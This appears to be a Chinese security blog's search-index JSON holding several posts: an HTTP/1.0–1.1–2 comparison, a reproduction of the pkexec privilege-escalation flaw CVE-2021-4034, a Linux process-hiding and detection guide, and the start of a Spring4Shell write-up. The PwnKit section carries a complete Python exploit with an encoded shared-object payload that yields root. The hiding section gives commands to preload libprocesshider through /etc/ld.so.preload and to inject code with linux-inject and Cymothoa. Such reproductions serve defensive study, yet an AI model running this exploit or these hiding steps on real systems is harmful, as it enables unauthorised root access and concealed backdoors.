HTTP1.1在Request消息头里头多了一个Host域，而且是必传的，HTTP1.0则没有这个域。 在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发 展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。 HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。此外，服务器应该接受以绝对路径标记的资源请求。 ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:2:2","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["计算机网络"],"content":"3.带宽优化 HTTP/1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了。又比如下载大文件时不支持断点续传功能，在发生断连后不得不重新下载完整的包。 HTTP/1.1中在请求消息中引入了range头域，它支持只请求资源的某个部分。在响应消息中Content-Range头域声明了返回的这部分对象的偏移值和长度。如果服务器相应地返回了对象所请求范围的内容，则响应码为206（Partial Content），它可以防止Cache将响应误以为是完整的一个对象。 Range头域可以请求实体的一个或者多个子范围。例如 表示头500个字节：bytes=0-499 表示第二个500字节：bytes=500-999 表示最后500个字节：bytes=-500 表示500字节以后的范围：bytes=500- 第一个和最后一个字节：bytes=0-0,-1 同时指定几个范围：bytes=500-600,601-999 Content-Range： 表示WEB服务器传送的范围，描述响应覆盖的范围和整个实体长度。一般格式为：bytes-unitSPfirst-byte-pos-last-byte-pos/entity-legth 例 如，传送头500个字节次字段的形式： Content-Range:bytes0- 499/1234 上述的1234为整个实体的长度。 另外一种浪费带宽的情况是请求消息中如果包含比较大的实体内容，但不确定服务器是否能够接收该请求（如是否有权限），此时若贸然发出带实体的请求，如果被拒绝也会浪费带宽。 HTTP/1.1加入了一个新的状态码100（Continue）。客户端事先发送一个只带头域的请求，如果服务器因为权限拒绝了请求，就回送响应码401（Unauthorized）；如果服务器接收此请求就回送响应码100，客户端就可以继续发送带实体的完整请求了。具体用法为：客户端在Request头部中包含Expect: 100-continue Server看到之后呢如果回100 (Continue) 这个状态代码，客户端就继续发requestbody。(注意，HTTP/1.0的客户端不支持100响应码，这个是HTTP1.1才有的。）如果回401，客户端就知道是什么意思了。 ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:2:3","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["计算机网络"],"content":"4.请求方法和响应状态码 HTTP1.1增加了OPTIONS,PUT, DELETE, TRACE, CONNECT这些Request方法 HTTP1.1 增加的新的status code有: (HTTP1.0没有定义任何具体的1xx status code, HTTP1.1有2个) 100 Continue 101 Switching Protocols 203 Non-Authoritative Information 205 Reset Content 206 Partial Content 302 Found (在HTTP1.0中有个 302 Moved Temporarily) 303 See Other 305 Use Proxy 307 Temporary Redirect 405 Method Not Allowed 406 Not Acceptable 407 Proxy Authentication Required 408 Request Timeout 409 Conflict 410 Gone 411 Length Required 412 Precondition Failed 413 Request Entity Too Large 414 Request-URI Too Long 415 Unsupported Media Type 416 Requested Range Not Satisfiable 417 Expectation Failed 504 Gateway Timeout 505 HTTP Version Not Supported ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:2:4","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["计算机网络"],"content":"5.Cache (缓存) 在HTTP/1.0中，已经定义不少有关缓存的头域： **Expires：**浏览器会在指定过期时间内使用本地缓存，指明应该在什么时候认为文档已经过期，从而不再缓存它，时间为格林威治时间GMT。例如: Expires: Thu, 19 Nov 1981 08:52:00 GMT Last-Modified：请求对象最后一次的修改时间，用来判断缓存是否过期 通常由文件的时间信息产生 Date：生成消息的具体时间和日期，即当前的GMT时间。例如：　Date: Sun, 17 Mar 2013 08:12:54 GMT If-Modified-Since：客户端存取的该资源最后一次修改的时间，用来和服务器端的Last-Modified做比较 Set-Cookie: 用于把cookie 发送到客户端。例如: Set-Cookie:PHPSESSID=c0huq7pdkmm5gg6osoe3mgjmm3; path=/ Pragma:no-cache：客户端使用该头域说明请求资源不能从cache中获取，而必须回源获取。 HTTP/1.1在1.0的基础上加入了一些cache的新特性： 1.当缓存对象的Age超过Expire时变为stale对象，cache不需要直接抛弃stale对象，而是与源服务器进行重新激活（revalidation）。 2.为了使caching机制更加灵活，HTTP/1.1增加了Cache-Control头域（请求消息和响应消息都可使用），它支持一个可扩展的指 令子集。请求时的缓存指令包括no-cache、no-store、max-age、max-stale、min-fresh、only-if- cached， 响应消息中的指令包括public、private、no-cache、no-store、no-transform、must- revalidate、proxy-revalidate、max-age。各个消息中的指令含义如下： Public指示响应可被任何缓存区缓存,并且在多用户间共享。 Private指示对于单个用户的整个或部分响应消息，不能被共享缓存处理，此响应消息对于其他用户的请求无效。 no-cache指示请求或响应消息不能缓存 no-store用于防止重要的信息被无意的发布，在请求消息中发送将使得请求和响应消息都不使用缓存。 max-age指示客户机可以接收生存期不大于指定时间（以秒为单位）的响应。 min-fresh指示客户机可以接收响应时间小于当前时间加上指定时间的响应。 max-stale指示客户机可以接收超出超时期间的响应消息。 must-revalidate：如果数据是过期的则去服务器进行获取 而且在请求消息或响应消息中设置Cache-Control并不会修改另一个消息处理过程中的缓存 处理过程。 3.Cache使用关键字索引在磁盘中缓存的对象：在HTTP/1.0中使用资源的URL作为关键字，但可能存在不同的资源基于同一个URL的情况，要区别它们还需要客户端提供更多的信息，如Accept-Language和Accept-Charset头域。为了更好的支持这种内容协商机制(content negotiation mechanism)，**HTTP/1.1在响应消息中引入了Vary头域，该头域列出了请求消息中需要包含哪些头域用于内容协商。**例如: Vary: Accept-Encoding 请求头字段 说明 响应头字段 Accept 告知服务器发送何种媒体类型 Content-Type Accept-Language 告知服务器发送何种语言 Content-Language Accept-Charset 告知服务器发送何种字符集 Content-Type Accept-Encoding 告知服务器采用何种压缩方式 Content-Encoding 有时候，上面四个 Accept 字段并不够用，例如要针对特定浏览器如 IE6 输出不一样的内容，就需要用到请求头中的 User-Agent 字段。类似的，请求头中的 Cookie 也可能被服务端用做输出差异化内容的依据。由于客户端和服务端之间可能存在一个或多个中间实体（如缓存服务器），而缓存服务最基本的要求是给用户返回正确的文档。如果服务端根据不同 User-Agent 返回不同内容，而缓存服务器把 IE6 用户的响应缓存下来，并返回给使用其他浏览器的用户，肯定会出问题 。所以 HTTP 协议规定，如果服务端提供的内容取决于 User-Agent 这样常规 Accept 协商字段之外的请求头字段，那么响应头中必须包含 Vary 字段，且 Vary 的内容必须包含 User-Agent。同理，如果服务端同时使用请求头中 User-Agent 和 Cookie 这两个字段来生成内容，那么响应中的 Vary 字段看上去应该是这样的：Vary: User-Agent, Cookie 也就是说 Vary 字段用于列出一个响应字段列表，告诉缓存服务器遇到同一个 URL 对应着不同版本文档的情况时，如何缓存和筛选合适的版本。 ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:2:5","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["计算机网络"],"content":"http1和http2区别 HTTP/2（超文本传输协议第2版，最初命名为HTTP 2.0），是HTTP协议的的第二个主要版本，使用于万维网。HTTP/2是HTTP协议自1999年HTTP 1.1发布后的首个更新，主要基于SPDY协议（是Google开发的基于TCP的应用层协议，用以最小化网络延迟，提升网络速度，优化用户的网络使用体验。 ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:3:0","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["计算机网络"],"content":"HTTP/1.1的缺陷 1.高延迟 带来页面加载速度的降低网络延迟问题主要由于队头阻塞(Head-Of-Line Blocking),导致带宽无法被充分利用。 队头阻塞是指当顺序发送的请求序列中的一个请求因为某种原因被阻塞时，在后面排队的所有请求也一并被阻塞，会导致客户端迟迟收不到数据。 2.无状态特性 带来的巨大HTTP头部 由于报文Header一般会携带\"User Agent\"“Cookie\"“Accept\"“Server\"等许多固定的头字段，多达几百字节甚至上千字节，但Body却经常只有几十字节（比如GET请求、 204/301/304响应），成了不折不扣的“大头儿子”。Header里携带的内容过大，在一定程度上增加了传输的成本。更要命的是，成千上万的请求响应报文里有很多字段值都是重复的，非常浪费。 3.明文传输–带来的不安全性 HTTP/1.1在传输数据时，所有传输的内容都是明文，客户端和服务器端都无法验证对方的身份，这在一定程度上无法保证数据的安全性。 4.不支持服务器推送消息 ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:3:1","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["计算机网络"],"content":"HTTP/2 新特性 1.二进制传输 HTTP/2传输数据量的大幅减少,主要有两个原因:以二进制方式传输和Header 压缩。我们先来介绍二进制传输,HTTP/2 采用二进制格式传输数据，而非HTTP/1.x 里纯文本形式的报文 ，二进制协议解析起来更高效,错误更少。 HTTP/2 将请求和响应数据分割为更小的帧，并且它们采用二进制编码。 2.Header 压缩 HTTP/2并没有使用传统的压缩算法，而是开发了专门的\"HPACK”算法，在客户端和服务器两端建立“字典”，用索引号表示重复的字符串，还采用哈夫曼编码来压缩整数和字符串，可以达到50%~90%的高压缩率。 假定一个页面有80个资源需要加载（这个数量对于今天的Web而言还是挺保守的）, 而每一次请求都有1400字节的消息头（着同样也并不少见，因为Cookie和引用等东西的存在）, 至少要7到8个来回去“在线”获得这些消息头。这还不包括响应时间——那只是从客户端那里获取到它们所花的时间而已。这全都由于TCP的慢启动机制，它会基于对已知有多少个包，来确定还要来回去获取哪些包 – 这很明显的限制了最初的几个来回可以发送的数据包的数量。相比之下，即使是头部轻微的压缩也可以是让那些请求只需一个来回就能搞定——有时候甚至一个包就可以了。这种开销是可以被节省下来的，特别是当你考虑移动客户端应用的时候，即使是良好条件下，一般也会看到几百毫秒的来回延迟。 3.多路复用 在 HTTP/2 中引入了多路复用的技术。多路复用很好的解决了浏览器限制同一个域名下的请求数量的问题，同时也接更容易实现全速传输，毕竟新开一个 TCP 连接都需要慢慢提升传输速度。 HTTP/1.x 有个问题叫线端阻塞(head-of-line blocking), 它是指一个连接(connection)一次只提交一个请求的效率比较高, 多了就会变慢。 HTTP/1.1 试过用流水线(pipelining)来解决这个问题, 但是效果并不理想(数据量较大或者速度较慢的响应, 会阻碍排在他后面的请求). 此外, 由于网络媒介(intermediary )和服务器不能很好的支持流水线, 导致部署起来困难重重。而多路传输(Multiplexing)能很好的解决这些问题, 因为它能同时处理多个消息的请求和响应; 甚至可以在传输过程中将一个消息跟另外一个掺杂在一起。所以客户端只需要一个连接就能加载一个页面。 4.Server Push HTTP2还在一定程度上改变了传统的“请求-应答”工作模式，服务器不再是完全被动地响应请求，也可以新建“流”主动向客户端发送消息。比如，在浏览器刚请求HTML的时候就提前把可能会用到的JS、CSS文件发给客户端，减少等待的延迟，这被称为\"服务器推送”（ Server Push，也叫 Cache push） 当浏览器请求一个网页时，服务器将会发回HTML，在服务器开始发送JavaScript、图片和CSS前，服务器需要等待浏览器解析HTML和发送所有内嵌资源的请求。服务器推送服务通过“推送”那些它认为客户端将会需要的内容到客户端的缓存中，以此来避免往返的延迟。 5.提高安全性 出于兼容的考虑，HTTP/2延续了HTTP/1的“明文”特点，可以像以前一样使用明文传输数据，不强制使用加密通信，不过格式还是二进制，只是不需要解密。 ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:3:2","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["渗透测试"],"content":"漏洞描述 Polkit（PolicyKit）是一个用于控制类Unix系统中控制系统范围权限的组件，它为非特权进程与特权进程的通信提供了一种有组织的方式。pkexec是Polkit开源应用框架的一部分，它负责协商特权进程和非特权进程之间的互动，允许授权用户以另一个用户的身份执行命令，是sudo的替代方案。 该漏洞是由于pkexec在处理传入参数的逻辑出现问题，导致环境变量被污染，最终交由pkexec代码逻辑执行实现客户机权限提升。有普通权限用户的攻击者通过执行漏洞文件，触发越界读写，从而在目标系统上造成权限提升。 ","date":"2022-04-29","objectID":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["漏洞复现","CVE-2021-4043","Linux提权"],"title":"CVE-2021-4034 polkit（pkexec）提权漏洞复现","uri":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"影响范围 由于 polkit 为系统预装工具，目前主流Linux版本均受影响。 不受影响的版本： CentOS： · CentOS 6：polkit-0.96-11.el6_10.2 · CentOS 7：polkit-0.112-26.el7_9.1 · CentOS 8.0：polkit-0.115-13.el8_5.1 · CentOS 8.2：polkit-0.115-11.el8_2.2 · CentOS 8.4：polkit-0.115-11.el8_4.2 Ubuntu： · Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1 · Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1 · Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6 · Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2 · Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1 Debain： · ：policykit-1 0.105-18+deb9u2 · Debain stretch：policykit-1 0.105-18+deb9u2 · Debain buster：policykit-1 0.105-25+deb10u1 · Debain bullseye：policykit-1 0.105-31+deb11u1 · Debain bookworm,bullseye：policykit-1 0.105-31.1 ","date":"2022-04-29","objectID":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["漏洞复现","CVE-2021-4043","Linux提权"],"title":"CVE-2021-4034 polkit（pkexec）提权漏洞复现","uri":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"漏洞复现 POC: #!/usr/bin/env python3 # poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys # hardcoded amd64 lib from ctypes import * from ctypes.util import find_library import os import zlib import base64 import tempfile payload = zlib.decompress( base64.b64decode( \"\"\"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\"\"\" ) ) libc = CDLL(find_library(\"c\")) libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p) libc.execve.restype = c_ssize_t wd = tempfile.mkdtemp() open(wd + \"/pwn.so\", \"wb\").write(payload) os.mkdir(wd + \"/gconv/\") open(wd + \"/gconv/gconv-modules\", \"w\").write( \"module UTF-8// INTERNAL ../pwn 2\" ) os.mkdir(wd + \"/GCONV_PATH=.\") os.mknod(wd + \"/GCONV_PATH=./gconv\") os.chmod(wd + \"/GCONV_PATH=.\", 0o777) os.chmod(wd + \"/GCONV_PATH=./gconv\", 0o777) os.chmod(wd + \"/pwn.so\", 0o777) os.chdir(wd) cmd = b\"/usr/bin/pkexec\" argv = [] envp = [ b\"gconv\", b\"PATH=GCONV_PATH=.\", b\"LC_MESSAGES=en_US.UTF-8\", b\"XAUTHORITY=../gconv\", b\"\", ] cargv = (c_char_p * (len(argv) + 1))(*argv, None) cenv = (c_char_p * (len(envp) + 1))(*envp, None) libc.execve(cmd, cargv, cenv) 或者网上其他POC也可以： https://github.com/berdav/CVE-2021-4034 上传python文件到ubuntu中并赋予执行权限： chmod u+x cve2021-4034.py 执行python文件： 成功提升至root权限！！！ ","date":"2022-04-29","objectID":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["漏洞复现","CVE-2021-4043","Linux提权"],"title":"CVE-2021-4034 polkit（pkexec）提权漏洞复现","uri":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"漏洞原理 当使用普通用户权限执行 pkexec 时，“GCONV_PATH”、“LD_PRELOAD” 等不安全的环境变量会被删除，但攻击者可以通过参数数组的越界读写漏洞，重新引入不安全的环境变量，进而构造利用链获取root权限。 参考以下文章： https://mp.weixin.qq.com/s/oRtXzf1HsHsqHK4DXfVtPg https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034 https://bbs.pediy.com/thread-271345.htm ","date":"2022-04-29","objectID":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:0","tags":["漏洞复现","CVE-2021-4043","Linux提权"],"title":"CVE-2021-4034 polkit（pkexec）提权漏洞复现","uri":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"修复建议 目前各Linux发行版官方均已给出安全补丁，建议用户尽快升级至安全版本，或参照官方说明措施进行缓解，CentOS、Ubuntu及Debian用户可参考以下链接： https://ubuntu.com/security/CVE-2021-4034 https://access.redhat.com/security/cve/CVE-2021-4034 https://security-tracker.debian.org/tracker/CVE-2021-4034 打补丁或升级到安全的版本，也可以pkexec 中删除 SUID 位作为临时缓解措施。 ","date":"2022-04-29","objectID":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:0","tags":["漏洞复现","CVE-2021-4043","Linux提权"],"title":"CVE-2021-4034 polkit（pkexec）提权漏洞复现","uri":"/cve-2021-4034-polkitpkexec%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["应急响应"],"content":"进程隐藏 让管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。 网上很多方法基本都是通过如下方式来达到进程隐藏： 1.根据分组权限来实现不同用户组查看不同的进程权限。 2.修改内核，将需要隐藏的进程的进程pid改为0（task-\u003epid = 0），因为ps,top命令不会显示进程id为0的进程。 3.修改内核，hook掉系统调用，在hook函数中修改逻辑判断已达到隐藏进程。 4.在用户态修改系统调用，从而隐藏进程(libprocesshider就是此方法)。 以下方法与上述无直接对应关系 ","date":"2022-04-29","objectID":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/:1:0","tags":["应急响应","进程隐藏"],"title":"Linux进程隐藏与检测","uri":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["应急响应"],"content":"第一种方法：libprocesshider github项目地址：https://github.com/gianlucaborello/libprocesshider 利用LD_PRELOA来实现系统函数的劫持，实现如下 # 下载程序编译 git clone https://github.com/gianlucaborello/libprocesshider.git cd libprocesshider/ \u0026\u0026 make # 移动文件到/usr/local/lib/目录下 cp libprocesshider.so /usr/local/lib/ # 把它加载到全局动态连接局 echo /usr/local/lib/libprocesshider.so \u003e\u003e /etc/ld.so.preload 测试运行evil_script.py 此时发现在top 与 ps 中都无法找到 evil_script.py ","date":"2022-04-29","objectID":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/:1:1","tags":["应急响应","进程隐藏"],"title":"Linux进程隐藏与检测","uri":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["应急响应"],"content":"第二种方法：进程注入工具linux-inject linux-inject是用于将共享对象注入Linux进程的工具 github项目地址： https://github.com/gaffffe23/linux-inject.git # 下载程序编译 git clone https://github.com/gaffe23/linux-inject.git cd linux-inject \u0026\u0026 make # 测试进程 ./sample-target # 进程注入 ./inject -n sample-target sample-library.so 验证进程注入成功，如下图所示： ","date":"2022-04-29","objectID":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/:1:2","tags":["应急响应","进程隐藏"],"title":"Linux进程隐藏与检测","uri":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["应急响应"],"content":"Cymothoa Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工 具最大的优点就是不创建新的进程，不容易被发现。 下载地址：https://sourceforge.net/projects/cymothoa/fifiles/cymothoa-1-beta/ # 下载解压 wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz tar zxvf cymothoa-1-beta.tar.gz # cd cymothoa-1-beta \u0026\u0026 make ","date":"2022-04-29","objectID":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/:1:3","tags":["应急响应","进程隐藏"],"title":"Linux进程隐藏与检测","uri":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["应急响应"],"content":"检测隐藏进程 unhide 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个 工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。 下载地址：http://www.unhide-forensics.info/ # 安装 sudo yum install unhide # 使用 unhide [options] test_list 使用 命令unhide proc发现隐藏进程evil_script.py ","date":"2022-04-29","objectID":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/:2:0","tags":["应急响应","进程隐藏"],"title":"Linux进程隐藏与检测","uri":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["应急响应"],"content":"参考 https://blog.csdn.net/weixin_45225923/article/details/120122800 https://blog.csdn.net/weixin_30300523/article/details/99481499 https://blog.csdn.net/weixin_29635919/article/details/116554850?spm=1001.2101.3001.6650.1\u0026utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.pc_relevant_default\u0026depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.pc_relevant_default\u0026utm_relevant_index=2 ","date":"2022-04-29","objectID":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/:3:0","tags":["应急响应","进程隐藏"],"title":"Linux进程隐藏与检测","uri":"/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/"},{"categories":["渗透测试"],"content":"漏洞简介 springframework 是spring 里面的一个基础开源框架，主要用于javaee的企业开发。2022年3月30日，Spring框架曝出RCE 0day漏洞，攻击者通过该漏洞可远程实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。 ","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:1:0","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"漏洞成因 该漏洞是由于 Spring Core 未对传输的数据进行有效的验证。Spring MVC 框架提供参数绑定功能，允许用请求中的参数绑定控制器方法中参数对象的成员变量。这一机制使得攻击者能够通过构造恶意请求获取 AccessLogValve 对象，继而注入恶意字段值触发 pipeline 机制，从而能够在未授权的情况下远程构造恶意数据，写入任意路径下的文件，从而导致远程代码执行。 